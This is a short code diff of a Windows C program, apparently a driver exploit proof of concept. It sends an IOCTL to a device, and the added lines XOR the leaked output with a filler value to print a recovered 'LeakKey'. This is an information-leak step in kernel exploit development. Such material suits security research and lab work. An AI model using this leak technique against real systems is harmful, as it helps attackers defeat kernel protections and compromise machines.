@@ -48,7 +48,7 @@ int main()
     printf("[!] Success open device");
 
     uintptr_t inputbuf = 0x8181818181818181;
-
+    size_t KEY = 0x0;
     char outputbuf[0x8] = { 0 };
     
     DWORD bytesReturned = 0;
@@ -67,12 +67,13 @@ int main()
     if (result) {
         printf("[*] IOCTL command sent successfully\n");
         printf("[!] LeakData: 0x%llx\n",inputbuf);
+        KEY = 0x8181818181818181 ^ inputbuf;
+        printf("[!] LeakKey: 0x%llx\n",KEY);
+
     } else {
         printf("Failed to send IOCTL command. Error: %ld\n", GetLastError());
     }
 
-    // free(inputbuf);
-    // CloseHandle(hDevice);
     return 0;
 }
 
